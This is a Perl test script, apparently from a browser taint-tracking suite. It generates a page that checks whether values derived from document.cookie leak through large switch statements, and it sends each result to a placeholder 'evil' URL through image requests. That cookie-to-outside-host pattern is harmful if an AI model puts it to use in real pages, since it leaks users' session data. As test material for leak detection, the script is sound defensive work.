#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_TABLESWITCHX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 42;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 

		switch (notevil) {
			default:
				dut = 5;
				break;
			case 42 : dut = 3;
				break;
			case 43 : dut = 4;
				break;		
|;
for ($i = 44; $i < 1800; $i++) {
print qq|			case $i:
				notevil = (notevil + $i)/2;
				break;
|;
}
print qq|
		}

		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			switch (notevil2) {
				default:
					dut2 = 5;
				break;
				case 42 : dut2 = 3;
					break;
				case 43 : dut2 = 4;
					break;		
|;
for ($i = 44; $i < 1800; $i++) {
print qq|			case $i:
					notevil2 = (notevil2 + $i)/2;
				break;
|;
}
print qq|		
			}
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		notevil3 = evil;
		switch (notevil3) {
			default:
				dut3 = 5;
			break;
			case 42 : dut3 = 3;
				break;
			case 43 : dut3 = 4;
				break;		
|;
for ($i = 44; $i < 1800; $i++) {
print qq|			case $i:
				notevil3 = (notevil3 + $i)/2;
				break;
|;
}
print qq|		
		}
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
